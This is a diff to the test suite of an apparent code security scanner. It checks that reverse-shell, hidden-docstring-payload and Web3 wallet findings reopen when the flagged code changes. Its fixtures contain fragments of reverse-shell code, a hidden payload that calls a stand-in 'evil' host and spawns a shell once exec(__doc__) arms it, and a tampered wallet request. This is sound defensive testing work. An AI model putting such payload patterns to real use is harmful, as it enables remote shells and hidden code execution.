@@ -735,23 +735,22 @@ def test_extract_evidence_records_multiline_after_oneline():
     assert sp._evidence_hash(eo) != sp._evidence_hash(ea)
 
 
-def test_extract_evidence_giant_span_binds_anchors_not_middle():
-    # A giant greedy DOTALL span bridging anchors across the whole file (here
-    # socket...connect...subprocess over 60+ unrelated lines) is bound by its head
-    # and tail anchor lines plus a digest, NOT the bridged middle, so churn in the
-    # middle (a dependency bump editing x = i to y = i) stays stable while the
-    # anchors are still pinned (it is not dropped, which would fail open).
+def test_extract_evidence_giant_span_binds_full_interior():
+    # A giant greedy DOTALL span bridging anchors across the whole file is bound by
+    # a digest of its full content (not just the outer anchors), so a cross-line
+    # payload inserted into the bridged interior between unchanged outer anchors
+    # reopens instead of riding the key. (Binding only head/tail would fail open on
+    # an interior insertion.) A pure line shift still stays stable.
     gap = "\n".join(f"    x = {i}" for i in range(70))
-    a = "import socket\nsock.connect(addr)\n" + gap + "\nos.dup2(fd, 0)\nsubprocess.Popen(cmd)\n"
-    b = (
-        "import socket\nsock.connect(addr)\n"
-        + gap.replace("x =", "y =")
-        + "\nos.dup2(fd, 0)\nsubprocess.Popen(cmd)\n"
-    )
-    ea = sp._extract_evidence(a, sp.RE_REVERSE_SHELL)
-    eb = sp._extract_evidence(b, sp.RE_REVERSE_SHELL)
-    assert "sha256:" in ea  # anchors are bound by a digest, not dropped
-    assert sp._evidence_hash(ea) == sp._evidence_hash(eb)  # middle churn stays stable
+    base = "import socket\nsock.connect(addr)\n" + gap + "\nos.dup2(fd, 0)\nsubprocess.Popen(cmd)\n"
+    # interior insertion of a cross-line payload between the unchanged outer anchors
+    injected = base.replace("    x = 35", "    x = 35\n    sock.connect(evilhost)")
+    ea = sp._extract_evidence(base, sp.RE_REVERSE_SHELL)
+    ei = sp._extract_evidence(injected, sp.RE_REVERSE_SHELL)
+    assert "sha256:" in ea  # full interior bound by a digest
+    assert sp._evidence_hash(ea) != sp._evidence_hash(ei)  # interior change reopens
+    shifted = sp._extract_evidence("\n\n" + base, sp.RE_REVERSE_SHELL)
+    assert sp._evidence_hash(ea) == sp._evidence_hash(shifted)  # pure shift stable
 
 
 def test_extract_evidence_giant_span_appended_payload_reopens():
@@ -769,6 +768,38 @@ def test_extract_evidence_giant_span_appended_payload_reopens():
     # a pure line shift of the same payload does not reopen
     shifted = sp._extract_evidence("\n\n" + appended, sp.RE_TEMP_EXEC)
     assert sp._evidence_hash(app) == sp._evidence_hash(shifted)
+
+
+def test_hidden_payload_binds_visible_exec_trigger():
+    # The hidden-payload finding binds the visible exec/eval line that makes the
+    # docstring runnable, so flipping a harmless eval("1+1") to exec(__doc__) (which
+    # now runs the same hidden network+exec payload) reopens instead of riding the
+    # key on the unchanged hidden text.
+    hidden = '"""\nimport requests; requests.get("http://evil")\nsubprocess.run(["sh"])\n"""\n'
+    benign = hidden + 'eval("1+1")\n'
+    armed = hidden + "exec(__doc__)\n"
+
+    def key(src):
+        return [
+            sp._finding_key(f)
+            for f in sp._hidden_payload_findings(src, sp._strip_noncode(src), "p/x.py", "p")
+            if "hidden network+exec" in f.check
+        ][0]
+
+    assert key(benign) != key(armed)
+
+
+def test_js_finding_pins_full_content_digest():
+    # A JS finding pins the full file content digest, so a backtick template literal
+    # that closes the bracket span early cannot let later option/body lines change
+    # without reopening (the Python-string-aware extractor would otherwise omit
+    # them). Holds for small files too, not just large bundles.
+    old = "window.ethereum.request(`tpl with ) paren`,\n  {method: 'eth', body: 'OLD'})\n"
+    new = "window.ethereum.request(`tpl with ) paren`,\n  {method: 'eth', body: 'EVIL'})\n"
+    fo = [f for f in sp.check_js_file(old, "p/w.js", "p") if "Web3" in f.check][0]
+    fn = [f for f in sp.check_js_file(new, "p/w.js", "p") if "Web3" in f.check][0]
+    assert "bundle-sha256:" in fo.evidence
+    assert sp._finding_key(fo) != sp._finding_key(fn)
 
 
 def test_extract_evidence_binds_moderate_appended_dotall_span():
